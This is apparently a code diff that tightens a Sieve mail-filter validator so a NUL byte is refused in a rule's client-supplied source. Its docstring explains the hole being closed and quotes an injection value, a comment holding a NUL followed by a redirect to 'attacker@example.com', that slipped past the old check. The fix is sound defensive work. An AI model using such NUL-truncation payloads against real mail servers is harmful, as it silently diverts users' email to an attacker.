@@ -1595,17 +1595,33 @@ def _unwritable_byte_error(script: SieveScript) -> str | None:
     does with the octets after it is undefined and one plausible reading runs
     them. CRLF stays legal because every CR in it is followed by LF.
 
-    A NUL, in everything EXCEPT `RawBlock.text` and `entry.source`. RFC 5228's
-    `octet-not-crlf` excludes %x00, so a NUL is never valid Sieve, and against a
-    C-implemented server it is the classic truncation desync. But a script that
-    ALREADY holds one fails to lex and comes back as a single whole-file
-    RawBlock, with the NUL in exactly those two fields and nowhere else —
-    verified. Refusing it there would lock a user out of saving their own file
-    over a byte that was already sitting on their server, which is a real cost
-    for no benefit: re-emitting bytes that are already there changes nothing,
-    and `RawBlock.text` is an arbitrary-text channel by design and by ADR 0002
-    regardless of what any of these checks say. Injecting a NUL into a preamble,
-    a tail or a comment is the opposite, and is refused.
+    A NUL, in everything EXCEPT a `RawBlock`'s own `text` and `source`. RFC
+    5228's `octet-not-crlf` excludes %x00, so a NUL is never valid Sieve, and
+    against a C-implemented server truncation at it is the classic desync.
+
+    The exemption is for the file that ALREADY holds one: a NUL that breaks
+    lexing takes the whole file down the `usable == False` path, where it comes
+    back as a single RawBlock carrying the entire text. Refusing it there locks
+    a user out of saving their own file over a byte that was already sitting on
+    their server, and re-emitting bytes that are already there changes nothing —
+    while `RawBlock.text` grants arbitrary statements by design and by ADR 0002
+    regardless, so a NUL buys an attacker nothing he does not already have.
+
+    A RULE'S `source` IS NOT EXEMPT, and an earlier version of this comment
+    claimed the lockout case put the NUL in `text` and `source` and nowhere else.
+    That is true only of a NUL that breaks lexing.
+    `parse_sieve('# note\x00here\n# --- n ---\nif ...')` lexes fine and yields a
+    RULE whose `source` carries the NUL. `source` is client-supplied and needs
+    only to survive `span_is_faithful` — and a comment ABOVE a rule rides in the
+    span BY DESIGN, in no compared field — so exempting it there made `source` a
+    free-text channel and wrote `# lead\x00redirect "attacker@example.com";` to
+    the mail server with a 200, byte-identical.
+
+    THE RESIDUAL COST, named rather than left to be discovered: a user whose file
+    lexes AND carries a NUL in a comment above a rule can no longer save it. That
+    is the same cost already accepted for a lone CR, which is refused in `source`
+    unconditionally. Accepting it for one byte and not the other was two opposite
+    principles applied to one shape.
 
     NOT CHECKED, DELIBERATELY: \x0b, \x0c, \x85, U+2028 and U+2029 all reach the
     output and all are legal comment octets under RFC 5228, which ends a comment
@@ -1615,10 +1631,12 @@ def _unwritable_byte_error(script: SieveScript) -> str | None:
     """
     one_comment_line: list[str] = []
     written_verbatim: list[str] = [script.preamble, script.requires_source, script.tail]
+    no_nul: list[str] = [script.preamble, script.requires_source, script.tail]
     for entry in script.entries:
         written_verbatim.append(entry.source)
         if isinstance(entry, Rule):
             one_comment_line.append(entry.name)
+            no_nul.append(entry.source)
         else:
             one_comment_line.append(entry.comment)
             written_verbatim.append(entry.text)
@@ -1629,7 +1647,7 @@ def _unwritable_byte_error(script: SieveScript) -> str | None:
     for text in (*one_comment_line, *written_verbatim):
         if _LONE_CR.search(text):
             return "a carriage return would end a line for the server but not for us"
-    for text in (*one_comment_line, script.preamble, script.requires_source, script.tail):
+    for text in (*one_comment_line, *no_nul):
         if "\x00" in text:
             return "a NUL would truncate the script for the server"
     return None
